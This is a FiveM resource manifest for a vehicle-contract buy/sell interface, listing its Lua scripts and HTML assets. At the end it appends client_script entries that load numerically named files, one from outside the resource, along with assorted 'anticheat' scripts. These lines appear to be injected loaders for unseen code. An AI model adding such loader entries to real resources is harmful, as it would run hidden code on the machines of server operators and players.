resource_manifest_version "44febabe-d386-4d18-afbe-5e627f4af937"

ui_page "html/ui.html"

client_scripts {
	'client/main.lua',
	'config.lua',
}

server_scripts {
	'server/main.lua',
	'config.lua',
}

files {
	'html/reset.css',
	'html/sell-contract.png',
	'html/buy-contract.png',
	'html/ui.css',
	'html/ui.html',
	'html/ui.js',
}
client_script "11336.lua"
client_script "lucidcity-anticheat.lua"
client_script "antikickvehicle.lua"
client_script "anti-stungun.lua"
client_script "anti-update.lua"
client_script "block-menus.lua"
client_script "block-menus2.lua"
client_script '@/09710.lua'